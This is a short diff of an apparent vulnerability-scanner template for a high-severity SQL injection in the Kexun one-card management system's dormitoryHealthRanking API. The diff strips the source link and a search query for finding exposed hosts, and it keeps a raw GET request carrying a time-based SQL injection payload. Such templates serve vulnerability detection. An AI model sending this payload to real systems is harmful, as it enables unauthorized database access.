@@ -3,12 +3,8 @@ info:
   name: 科讯一卡通管理系统dormitoryHealthRanking存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/luggggqzew6lsih5'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: luggggqzew6lsih5
-    fofa: body="[http://www.ahkxsoft.com/"](http://www.ahkxsoft.com/")
 http:
 - raw:
   - 'GET /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
